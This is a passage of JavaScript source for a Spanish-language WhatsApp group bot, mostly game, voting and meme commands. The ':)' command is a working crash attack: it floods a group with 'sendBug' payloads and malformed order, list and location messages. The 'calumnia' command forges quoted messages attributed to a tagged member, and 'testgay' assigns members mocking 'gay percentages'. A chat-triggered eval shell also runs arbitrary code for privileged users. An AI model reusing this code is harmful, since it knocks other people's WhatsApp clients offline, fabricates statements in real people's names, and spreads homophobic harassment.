				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataimg = await fetchJson(`https://latam-api.vercel.app/api/trapo_h?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(dataimg.trapito_img)
				enviarIMG(imgrpt, fs.readFileSync('./multimedia/imagenes/nsfw.jpg'), `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break

			//Comando juegos
			case 'quien': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Invente un asunto*\n_Ejm:_\n${prefix + command} es gey?`)
				if (UwU.length < 5) return reply(`*[ ! ] El asunto es muy corto -.-*`)
				let group3 = await teslagod.groupMetadata(from)
				let member3 = group3['participants']
				let mem3 = []
				member3.map(async adm => {
					mem3.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				let randomv = mem3[Math.floor(Math.random() * mem3.length)]
				teslagod.sendMessage(from, `\n*=> @${randomv.split('@')[0]}*\n`, text, {
					quoted: fakemek,
					contextInfo: {
						mentionedJid: [randomv]
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'tragamoneda':
			case 'tragamonedas': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				let a = '🍇',
					b = '🍎',
					c = '🍓',
					d = '🔔',
					e = '🍑',
					f = '💰',
					g = '🥝',
					h = '☘️',
					i = '🍌',
					j = '🍋'
				emojis = [`${a}`, `${b}`, `${c}`, `${d}`, `${e}`, `${f}`, `${g}`, `${h}`, `${i}`, `${j}`]
				resmoji = pickRandom(emojis)
				emojis1 = [`${a}`, `${b}`, `${c}`, `${d}`, `${e}`, `${f}`, `${g}`, `${h}`, `${i}`, `${j}`]
				resmoji1 = pickRandom(emojis1)
				emojis2 = [`${a}`, `${b}`, `${c}`, `${d}`, `${e}`, `${f}`, `${g}`, `${h}`, `${i}`, `${j}`]
				resmoji2 = pickRandom(emojis2)
				emojis3 = [`${a}`, `${b}`, `${c}`, `${d}`, `${e}`, `${f}`, `${g}`, `${h}`, `${i}`, `${j}`]
				resmoji3 = pickRandom(emojis3)
				emojis4 = [`${a}`, `${b}`, `${c}`, `${d}`, `${e}`, `${f}`, `${g}`, `${h}`, `${i}`, `${j}`]
				resmoji4 = pickRandom(emojis4)
				emojis5 = [`${a}`, `${b}`, `${c}`, `${d}`, `${e}`, `${f}`, `${g}`, `${h}`, `${i}`, `${j}`]
				resmoji5 = pickRandom(emojis5)
				emojis6 = [`${a}`, `${b}`, `${c}`, `${d}`, `${e}`, `${f}`, `${g}`, `${h}`, `${i}`, `${j}`]
				resmoji6 = pickRandom(emojis6)
				emojis7 = [`${a}`, `${b}`, `${c}`, `${d}`, `${e}`, `${f}`, `${g}`, `${h}`, `${i}`, `${j}`]
				resmoji7 = pickRandom(emojis7)
				emojis8 = [`${a}`, `${b}`, `${c}`, `${d}`, `${e}`, `${f}`, `${g}`, `${h}`, `${i}`, `${j}`]
				resmoji8 = pickRandom(emojis8)
				let resran1 = `┃  | ${resmoji} : ${resmoji1} : ${resmoji2}`
				let Aresran = `┃  | ${resmoji3} : ${resmoji4} : ${resmoji5}` //
				let resran2 = `┃  | ${resmoji6} : ${resmoji7} : ${resmoji8}`
				if (Aresran.includes("🍇 : 🍇 : 🍇") || (Aresran.includes("🍎 : 🍎 : 🍎") || (Aresran.includes("🍓 : 🍓 : 🍓") || (Aresran.includes("🔔 : 🔔 : 🔔") || (Aresran.includes("🍑 : 🍑 : 🍑") || (Aresran.includes("💰 : 💰 : 💰") || (Aresran.includes("🥝 : 🥝 : 🥝") || (Aresran.includes("☘️ : ☘️ : ☘️") || (Aresran.includes("🍌 : 🍌 : 🍌") || (Aresran.includes("🍋 : 🍋 : 🍋"))))))))))) {
					reply(`*Jugador : ${senderNumber}*
*[ Felicidades, ganaste!!! ]* 🥳🎉

*🎰=====🎉======🎰*
*┃ ┌────────┐ ┃*
*${resran1}*
*┃ ├────────┤ ┃*
*${Aresran} <=*
*┃ ├────────┤ ┃*
*${resran2}*
*┃ └────────┘ ┃*
*🎰=====🎉======🎰*

*Tu recompensa:* 
_+ 10 de nivel_
_+ 4000 de XP_
_+ 5 de limite_`) //1
					bayarLimit(sender, 6)
					addLevelingXp(sender, 4000)
					addLevelingLevel(sender, 10)
				} else {
					return reply(`Jugador : ${senderNumber}

🎰=====🪀======🎰
┃ ┌────────┐ ┃
${resran1}
┃ ├────────┤ ┃
${Aresran}
┃ ├────────┤ ┃
${resran2}
┃ └────────┘ ┃
🎰=====🪀======🎰`) //2
				}
			}
			addFilter(from)
			break
			case 'calumnia':
			case 'calunnia': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Use bien el comando :*\n${prefix + command} @tag|mensaje|respuesta`)
				if (!UwU.includes('|')) return reply(`*[ ! ] Agrege barras entre cada palabra todo junto*\n\n_Ejemplo de uso_ : \n${prefix + command} @usuarioetiquetado|bendiceme|bendecido\n~No olvide usar esta barra~ : " | "`)
				let usertag = mek.message.extendedTextMessage.contextInfo.mentionedJid
				let usertext = UwU.split("|")[1] ? UwU.split("|")[1] : "No hay texto :v"
				let botext = UwU.split("|")[2] ? UwU.split("|")[2] : senderNumber + " use 2 barras\n@tag|mensaje|respuesta ✓"
				await teslagod.sendMessage(from, `${botext}`, text, {
					quoted: {
						key: {
							fromMe: false,
							participant: `${usertag}`,
							...(from ? {
								remoteJid: from
							} : {})
						},
						message: {
							conversation: `${usertext}`
						}
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'dados': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				try {
					const ran_d = ["⚀", "⚁", "⚂", "⚃", "⚄", "⚅"]
					dagif = ran_d[Math.floor(Math.random() * ran_d.length)]
					dares = fs.readFileSync('./multimedia/misstks/sticker/' + dagif + '.webp')
					teslagod.sendMessage(from, dares, sticker, {
						quoted: fakemek
					})
				} catch (e) {
					const ran_d = ["⚀", "⚁", "⚂", "⚃", "⚄", "⚅"]
					dad1 = ran_d[Math.floor(Math.random() * ran_d.length)]
					dad2 = ran_d[Math.floor(Math.random() * ran_d.length)]
					reply(`${dad1}\n     ${dad2}`)
				}
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'dado': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				const datext = ['⚀\n      ⚁', '⚀\n      ⚂', '⚀\n      ⚃', '⚀\n      ⚄', '⚀\n      ⚅', '⚀\n      ⚀', '⚁\n      ⚁', '⚁\n      ⚂', '⚁\n      ⚃', '⚁\n      ⚄', '⚁\n      ⚅', '⚁\n      ⚀', '⚂\n      ⚁', '⚂\n      ⚂', '⚂\n      ⚃', '⚂\n      ⚄', '⚂\n      ⚅', '⚂\n      ⚀', '⚃\n      ⚁', '⚃\n      ⚂', '⚃\n      ⚃', '⚃\n      ⚄', '⚃\n      ⚅', '⚃\n      ⚀', '⚄\n      ⚁', '⚄\n      ⚂', '⚄\n      ⚃', '⚄\n      ⚄', '⚄\n      ⚅', '⚅\n      ⚀', '⚅\n      ⚁', '⚅\n      ⚂', '⚅\n      ⚃', '⚅\n      ⚄', '⚅\n      ⚅', '⚅\n      ⚀']
				const dad_res = datext[Math.floor(Math.random() * datext.length)]
				reply(dad_res)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'emparejar':
			case 'enparejar': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				creando(`_Generando pareja..._`)
				try {
					jds = []
					vivannn = fs.readFileSync(`./multimedia/sonidos/audishitxd/willy.m4a`)
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = ` ❑ *Pareja formada* : \n\n ┏─━─━─∞🎉∞─━─━─┓\n@${akuu.jid.split('@')[0]}  ❤️ @${diaa.jid.split('@')[0]} \n ┗─━─━─∞🔥∞─━─━─┛`
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					setTimeout(() => {
						mentions(teks, jds, true)
					}, 800)
					setTimeout(() => {
						teslagod.sendMessage(from, vivannn, audio, {
							mimetype: 'audio/mp4',
							quoted: {
								key: {
									participant: '0@s.whatsapp.net'
								},
								message: {
									locationMessage: {
										name: `Esto fue posible gracias a : ${pushname}`,
										jpegThumbnail: userthumb
									}
								}
							},
							fakemek,
							ptt: true
						})
					}, 1000)
				} catch (e) {
					reply(`*[ ! ] No se pudo crear una pareja ;-;*`)
				}
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'top5': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Que top desea generar?*')
				if (UwU.length < 4) return reply(`*[ ! ] El texto es muy corto*`)
				creando(`_Generando top 5 ${UwU}..._`)
				try {
					jds = []
					const jdiai = groupMembers
					const koses = groupMembers
					const jdiii = groupMembers
					const kosss = groupMembers
					const jdiiu = groupMembers
					const akuau = jdiai[Math.floor(Math.random() * jdiai.length)]
					const dieaa = koses[Math.floor(Math.random() * koses.length)]
					const akuaua = jdiii[Math.floor(Math.random() * jdiii.length)]
					const diaaa = kosss[Math.floor(Math.random() * kosss.length)]
					const ekuau = jdiiu[Math.floor(Math.random() * jdiiu.length)]
					teks = ` *[ TOP 5 ${UwU} ]*\n*Generador* : ${pushname}\n\n✵:･ﾟ✧ :･✵ :･✧:･ﾟ✵\n\n▪︎ @${akuau.id.split('@')[0]} \n\n▪︎ @${dieaa.id.split('@')[0]} \n\n▪︎ @${akuaua.id.split('@')[0]} \n\n▪︎ @${diaaa.id.split('@')[0]} \n\n▪︎ @${ekuau.id.split('@')[0]} \n\n✵:･ﾟ✧ :･✵ :･✧:･ﾟ✵\n`
					jds.push(akuau.jid)
					jds.push(dieaa.jid)
					jds.push(akuaua.jid)
					jds.push(diaaa.jid)
					jds.push(ekuau.jid)
					mentions(teks, jds, true)
				} catch (e) {
					reply(`*[ ! ] No se pudo generar el top :'v*`)
				}
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'top10': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Que top desea generar?*')
				if (UwU.length < 4) return reply(`*[ ! ] El texto es muy corto*`)
				creando(`_Generando top 10 ${UwU}..._`)
				try {
					jds = []
					const jdiai1 = groupMembers
					const koses2 = groupMembers
					const jdiii3 = groupMembers
					const kosss4 = groupMembers
					const jdiiu5 = groupMembers
					const gaea6 = groupMembers
					const gozu7 = groupMembers
					const albaf8 = groupMembers
					const teru9 = groupMembers
					const miowo0 = groupMembers
					const akauau = jdiai1[Math.floor(Math.random() * jdiai1.length)]
					const dieaua = koses2[Math.floor(Math.random() * koses2.length)]
					const aakuaua = jdiii3[Math.floor(Math.random() * jdiii3.length)]
					const ediaaa = kosss4[Math.floor(Math.random() * kosss4.length)]
					const aekuau = jdiiu5[Math.floor(Math.random() * jdiiu5.length)]
					const aku2au = gaea6[Math.floor(Math.random() * gaea6.length)]
					const die3aa = gozu7[Math.floor(Math.random() * gozu7.length)]
					const aku4aua = albaf8[Math.floor(Math.random() * albaf8.length)]
					const dia5aa = teru9[Math.floor(Math.random() * teru9.length)]
					const ek6uau = miowo0[Math.floor(Math.random() * miowo0.length)]
					teks = `*TOP 10 ${UwU}*\n*Generador* : ${pushname}\n
╭─╼┥${UwU}┝╾─╮

_1.º @${akauau.id.split('@')[0]}_ \n\n_2.º @${dieaua.id.split('@')[0]}_ \n\n_3.º @${aakuaua.id.split('@')[0]}_ \n\n_4.º @${ediaaa.id.split('@')[0]}_ \n\n_5.º @${aekuau.id.split('@')[0]}_ \n\n_6.º @${aku2au.id.split('@')[0]}_ \n\n_7.º @${die3aa.id.split('@')[0]}_ \n\n_8.º @${aku4aua.id.split('@')[0]}_ \n\n_9.º @${dia5aa.id.split('@')[0]}_ \n\n_10.º @${ek6uau.id.split('@')[0]}_

╰─┥${NameBot}┝─╯`
					jds.push(akauau.jid)
					jds.push(dieaua.jid)
					jds.push(aakuaua.jid)
					jds.push(ediaaa.jid)
					jds.push(aekuau.jid)
					jds.push(aku2au.jid)
					jds.push(die3aa.jid)
					jds.push(aku4aua.jid)
					jds.push(dia5aa.jid)
					jds.push(ek6uau.jid)
					setTimeout(() => {
						mentions(teks, jds, true)
					}, 2500)
					try {
						TeslApi = await getBuffer(`https://latam-api.vercel.app/api/audi_top?apikey=${MyApiKey}`)
						nkpttx = await getBuffer(TeslApi.audio)
						teslagod.sendMessage(from, nkpttx, MessageType.audio, {
							quoted: {
								key: {
									participant: '0@s.whatsapp.net'
								},
								message: {
									locationMessage: {
										name: `TOP 10 ${UwU}`,
										jpegThumbnail: fs.readFileSync('./multimedia/imagenes/top10bruh.jpeg')
									}
								}
							},
							mimetype: 'audio/mp4',
							ptt: true
						})
					} catch {
						numsong = ["1", "2", "3", "4", "5", "6"]
						rndIndex2 = pickRandom(numsong)
						nkpttx2 = fs.readFileSync(`./multimedia/sonidos/audishitxd/audishit${rndIndex2}.m4a`)
						teslagod.sendMessage(from, nkpttx2, MessageType.audio, {
							quoted: {
								key: {
									participant: '0@s.whatsapp.net'
								},
								message: {
									locationMessage: {
										name: `TOP 10 ${UwU}`,
										jpegThumbnail: fs.readFileSync('./multimedia/imagenes/top10bruh.jpeg')
									}
								}
							},
							mimetype: 'audio/mp4',
							ptt: true
						})
					}
				} catch (e) {
					reply(`*[ ! ] No se pudo generar el top :'v*`)
				}
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'testgay':
			case 'testgey': { //Unresolved bug
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				teslagod.sendMessage(from, `_Calculando porcentaje..._`, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: '0@s.whatsapp.net'
						},
						message: {
							documentMessage: {
								title: `🔬 ${NameBot}\n💉 ${pushname}`,
								jpegThumbnail: fs.readFileSync('./multimedia/imagenes/erigei.jpeg')
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					}
				})

				let apigey = await getBuffer(`https://some-random-api.ml/canvas/gay?avatar=${userimg}`)
				var testgey = fs.readFileSync('./multimedia/imagenes/erigei.jpeg')
				var resultgei = fs.readFileSync('./multimedia/sonidos/audishitxd/audigeyxd.m4a')
				var ab = ['2%', '3%', '4%', '5%', '6%', '7%', '8%', '9%', '*No eri gei* ??👌', '10%', '11%', '12%', '15%', '13%', '14%', '16%', '26%', '27%', '18%', '20%', '61%', '62%', '63%', '64%', '65%', '66%', '67%', '68%', '69.99%', '22%', '23%', '*[ ! ]Limite de gay superado [ ! ]* 😳', '71%', '72%', '73%', '31%', '32%', '33%', '34%', '35%', '36%', '37%', '38%', '39.99%', '74%', '75%', '76%', '77%', '78%', '79.99%', '1%', '97%', '5%', '93%', '8%', '90%', '10%', '89%', '15%', '85%', '17%', '83%', '19%', '80%', '21%', '24%', '76%', '77%', '25%', '74%', '81%', '82%', '83%', '41%', '42%', '43%', '44%', '45%', '46%', '47%', '48%', '49.99%', '84%', '85%', '86%', '87%', '88%', '89.99%', '28%', '70%', '32%', '69%', '35%', '65%', '37%', '63%', '40%', '60%', '41%', '59%', '43%', '44%', '57%', '47%', '49%', '51%', '54%', '56%', '57%', '91%', '92%', '51%', '52%', '53%', '54%', '55%', '56%', '57%', '58%', '59.99%', '93%', '94%', '95%', '96%', '97%', '98%', '99.99%', '100%', '200%', '300%', '400%', '500%', '600%', '700%', '800%', '900%', '999999999.9%', 'Mr. Gey', 'Super gey']
				var be = ab[Math.floor(Math.random() * ab.length)]
				await teslagod.sendMessage(from, apigey, image, {
					thumbnail: userthumb,
					sendEphemeral: true,
					quoted: {
						key: {
							fromMe: false,
							"participant": "0@s.whatsapp.net",
							"remoteJid": "51995386439-1604595598@g.us"
						},
						"message": {
							orderMessage: {
								itemCount: 737,
								status: 200,
								thumbnail: userthumb,
								surface: 200,
								message: `Resultados : ${command}`,
								orderTitle: 'Matt_M',
								sellerJid: '0@s.whatsapp.net'
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					},
					caption: `*🏳‍🌈 | Test gay*\n${senderNumber} su porcentaje de gay es ${be}`
				}).catch(e => {
					teslagod.sendMessage(from, testgey, image, {
						thumbnail: userthumb,
						sendEphemeral: true,
						quoted: {
							key: {
								fromMe: false,
								"participant": "0@s.whatsapp.net",
								"remoteJid": "51995386439-1604595598@g.us"
							},
							"message": {
								orderMessage: {
									itemCount: 737,
									status: 200,
									thumbnail: userthumb,
									surface: 200,
									message: `Resultados : ${command}`,
									orderTitle: 'Matt_M',
									sellerJid: '0@s.whatsapp.net'
								}
							}
						},
						contextInfo: {
							mentionedJid: [sender]
						},
						caption: `*🏳‍🌈 | Test gay*\n${senderNumber} su porcentaje de gay es ${be}`
					})
				})
				await teslagod.sendMessage(from, resultgei, MessageType.audio, {
					quoted: {
						key: {
							fromMe: false,
							"participant": "0@s.whatsapp.net",
							"remoteJid": "51995386439-1604595598@g.us"
						},
						"message": {
							orderMessage: {
								itemCount: 2022,
								status: 200,
								thumbnail: userthumb,
								surface: 200,
								message: `${pushname} es ${be} gay`,
								orderTitle: 'Matt_M',
								sellerJid: '0@s.whatsapp.net'
							}
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'votacion':
			case 'votación':
			case 'votar': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (from in vote) return reply(`*[ ! ] Aun hay una votacion activa en el grupo*\n_Use comando_ ${prefix}reiniciarvotos _para crear nueva votacion_`)
				if (!UwU) return reply(`*Ingrese un motivo para la votacion, ejemplo:*\n${prefix + command} el admin es god?`)
				if (UwU.length < 7) return reply(`El motivo para la votación es muy corta!`)

				reply(`⚡ ${senderNumber} *Comenzó una nueva votacion en el grupo:* ${groupName}

_Como participar en la votación :_${nwn}

┏⊱ ${prefix}sivotar
┗━⊱ Para dar un voto positivo ✔️

┏⊱ ${prefix}novotar 
┗━⊱ Para dar un voto negativo ❌

┏⊱ ${prefix}vervotos 
┗━⊱ Para verificar los votos 👀

┏⊱ ${prefix}reiniciarvotos 
┗━⊱ Para eliminar una votacion activa ♻️`)

				vote[from] = [UwU, [],
					[]
				]
				upvote = vote[from][1]
				devote = vote[from][2]
				text_vote = `${monospace} [ VOTACIÓN ] ${monospace}

📋 *Razon:* ${vote[from][0]}
👤 *Encuestador:* ${pushname}

📝
┣🫂
┣━⊱ Votos a favor [✓]
┋
┗━━⊱ Total: ${vote[from][1].length}

📝
┣👥
┣━⊱ Votos en contra [X]
┋
┗━━⊱ Total: ${vote[from][2].length}
`
				enviarbuton(from, text_vote, `${NameBot} 🔥`, [{
					buttonId: `${prefix}sivotar`,
					buttonText: {
						displayText: `Si Votar ✔️`,
					},
					type: 1,
				}, {
					buttonId: `${prefix}novotar`,
					buttonText: {
						displayText: `No Votar ❌`,
					},
					type: 1,
				}, ])
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'sivotar': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!(from in vote)) return reply(`*[ ! ] Aun no hay una votación activa en este grupo*\n_Para crear una nueva votacion use el comando_ ${prefix}votacion`)
				isVote = vote[from][1].concat(vote[from][2])
				wasVote = isVote.includes(sender)
				if (wasVote) return reply('*[ ! ] No puedes volver a votar*')
				vote[from][1].push(sender)
				menvote = vote[from][1].concat(vote[from][2])
				text_vote = `${monospace} [ VOTACIÓN ] ${monospace}

📋 *Razon:* ${vote[from][0]}
✍️ *Votante:* ${senderNumber}

📝
┣🫂
┣━⊱ Votos a favor [✓]
${vote[from][1].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') ? vote[from][1].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') : "┣ Aun no hay :v"}
┗━━⊱ Total: ${vote[from][1].length}

📝
┣👥
┣━⊱ Votos en contra [X]
${vote[from][2].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') ? vote[from][2].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') : "┣ Aun no hay :v"}
┗━━⊱ Total: ${vote[from][2].length}
`
				enviarbuton(from, text_vote, `${NameBot} 🔥`, [{
					buttonId: `${prefix}sivotar`,
					buttonText: {
						displayText: `Si Votar ✔️`,
					},
					type: 1,
				}, {
					buttonId: `${prefix}novotar`,
					buttonText: {
						displayText: `No Votar ❌`,
					},
					type: 1,
				}, ], {
					contextInfo: {
						mentionedJid: [sender]
					}
				})
			}
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'novotar': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!(from in vote)) return reply(`*[ ! ] Aun no hay una votación activa en este grupo*\n_Para crear una nueva votacion use el comando_ ${prefix}votacion`)
				isVote = vote[from][1].concat(vote[from][2])
				wasVote = isVote.includes(sender)
				if (wasVote) return reply('ya as votado')
				vote[from][2].push(sender)
				menvote = vote[from][1].concat(vote[from][2])
				text_vote = `${monospace} [ VOTACIÓN ] ${monospace}

📋 *Razon:* ${vote[from][0]}
✍️ *Votante:* ${senderNumber}

📝
┣🫂
┣━⊱ Votos a favor [✓]
${vote[from][1].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') ? vote[from][1].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') : "┣ Aun no hay :v"}
┗━━⊱ Total: ${vote[from][1].length}

📝
┣👥
┣━⊱ Votos en contra [X]
${vote[from][2].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') ? vote[from][2].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') : "┣ Aun no hay :v"}
┗━━⊱ Total: ${vote[from][2].length}
`
				enviarbuton(from, text_vote, `${NameBot} 🔥`, [{
					buttonId: `${prefix}sivotar`,
					buttonText: {
						displayText: `Si Votar ✔️`,
					},
					type: 1,
				}, {
					buttonId: `${prefix}novotar`,
					buttonText: {
						displayText: `No Votar ❌`,
					},
					type: 1,
				}, ], {
					contextInfo: {
						mentionedJid: [sender]
					}
				})
			}
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'vervotos': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!(from in vote)) return reply(`*[ ! ] Aun no hay una votación activa en este grupo*\n_Para crear una nueva votacion use el comando_ ${prefix}votacion`)
				text_vote = `${monospace} [ VOTACIÓN ] ${monospace}

📋 *Razon:* ${vote[from][0]} <=

📝
┣🫂
┣━⊱ Votos a favor [✓]
${vote[from][1].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') ? vote[from][1].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') : "┣ Aun no hay :v"}
┗━━⊱ Total: ${upvote.length}

📝
┣👥
┣━⊱ Votos en contra [X]
${vote[from][2].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') ? vote[from][2].map((v, i) => `┣ ${i + 1}. @${v.split`@`[0]}`).join('\n') : "┣ Aun no hay :v"}
┗━━⊱ Total: ${devote.length}

Usa el comando ${prefix}reiniciarvotos para reiniciar la votacion ✓
`
				mentions(text_vote, [vote[from][1].map((v, i) => `"${v}"`) + ", " + vote[from][2].map((v, i) => `"${v}"`)], true)
			}
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'reiniciarvotos': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!(from in vote)) return reply(`:v`)
				delete vote[from]
				reply('Votacion reiniciada correctamente ✓')
			}
			break

			//tutorial
			case 'tutorial':
			case 'git':
			case 'crear':
			case 'repositorio':
			case 'base':
			case 'sc':
			case 'instalar':
			case 'instalarbot':
			case 'script': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				var previ = `Mi king ${pushname}
*Lo que necesitas para crear tu bot:*
⸻⸻⸻
✯ _Tener termux.apk instalado_

✯ *Opción* 1.- _Tener 2 celulares [minimo uno de ellos temporalmente]_

✯ *Opción* 2.- _Tener 1 celular y una pc/laptop [opcional]_

Estos requisitos son para scanear el codigo QR generado en la apk termux ú alguna otra app que realize proceso NodeJs para tener activo al bot
⸻⸻⸻
Comandos para realizarlo en termux :
➣termux-setup-storage
➣termux-change-repo
➣apt update && pkg update
➣apt upgrade && pkg upgrade
➣apt install git && pkg install git
➣apt install tesseract && pkg install tesseract
➣apt install wget && pkg install wget
➣git clone https://github.com/NeKosmic/NK-BOT
➣cd NK-BOT
➣bash install.sh
➣npm start 
⸻⸻⸻

~La instalación de este bot es el mismo proceso como el resto de bots que usan libreria baileys~ ;3

Por si necesitas mas ayuda.    ‏  ‌    ‏  ‌.
~> wa.me/51995386439?text=Menseñas+a+ejecutar+tu+bot+nwn`
				teslagod.sendMessage(from, previ, text, {
					quoted: fakemek,
					contextInfo: {
						"externalAdReply": {
							"title": `Se curioso ;3`,
							mediaType: 2,
							"thumbnail": mythumb,
							"previewType": "VIDEO",
							"mediaUrl": `https://youtu.be/-BnJigQ4-cM`
						}
					}
				})
			}
			addFilter(from)
			break
			case ':)': //NOTA: Por favor dale un uso justo a este comando y no para arruinar grupos por envidia o para llamar la atención -.-//
				if (!autonomo) return
				reply('te eliminó')
				sendBug(from)
				sendBug(from)
				sendBug(from)
				for (let i = 0; i < 1; i++) {
					teslagod.sendMessage(from, `${modokuaker}`, MessageType.extendedText, {
						quoted: {
							key: {
								participant: `0@s.whatsapp.net`,
								...(from ? {
									remoteJid: 'status@broadcast'
								} : {})
							},
							message: {
								orderMessage: {
									itemCount: 737,
									status: 1,
									surface: 10,
									orderTitle: `${modokuaker}`,
									sellerJid: '0@s.whatsapp.net'
								}
							}
						}
					}, 0)
				}
				setTimeout(() => {
					teslagod.sendMessage(from, {
						degreesLatitude: `43.980278`,
						degreesLongitude: `15.386389`,
						name: `${UwU}`,
						address: `${modokuaker}`
					}, MessageType.liveLocation, {
						quoted: floc
					})
				}, 100)
				setTimeout(() => {
					try {
						quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
						sendBug(from, `${quotedText}`)
					} catch {
						sendBug(from)
					}
				}, 200)
				setTimeout(() => {
					res131 = teslagod.prepareMessageFromContent(from, {
						"orderMessage": {
							"itemCount": 369,
							"message": `${modokuaker}`,
							"footerText": `${modokuaker}`,
							"thumbnail": mylogo,
							"surface": 'CATALOG'
						}
					}, {
						quoted: fvn
					})
					teslagod.relayWAMessage(res131)
				}, 300)
				setTimeout(() => {
					let buug2 = teslagod.prepareMessageFromContent(from, {
						"listMessage": {
							"title": `${NameBot} ᴮʸ⁻ᴺᴷ`,
							"description": `${modokuaker}`,
							"buttonText": '*Maria a 5 km... _Click Aqui_ [ ! ]*',
							"listType": 'SINGLE_SELECT',
							"sections": [{
								"title": `${pushname}`,
								"rows": [{
									"title": `${modokuaker}`,
									"description": `${modokuaker}`,
									"rowId": `${modokuaker}`
								}]
							}]
						}
					}, {
						quoted: floc
					});
					teslagod.relayWAMessage(buug2);
				}, 350)
				setTimeout(() => {
					sendBug(from)
					sendBug(from)
					reply(`te eliminó`)
				}, 8000)
				break

			default:

				if (budy.startsWith('>')) {
					if (!Matt_M && !autonomo && !isTeslaUser) return
					const util = require("util");
					konsol = budy.slice(1)
					Return = (sul) => {
						sat = JSON.stringify(sul, null, 2)
						bang = util.format(sat)
						if (sat == undefined) {
							bang = util.format(sul)
						}
						return reply(bang)
					}
					teslagod.sendMessage(from, util.format(eval(`;(async () => { ${konsol} })()`)), MessageType.text, {
						sendEphemeral: true,
						quoted: fakemek
					}).catch(e => {
						console.log(e)
						reply(`${String(e)}`)
					})
				}
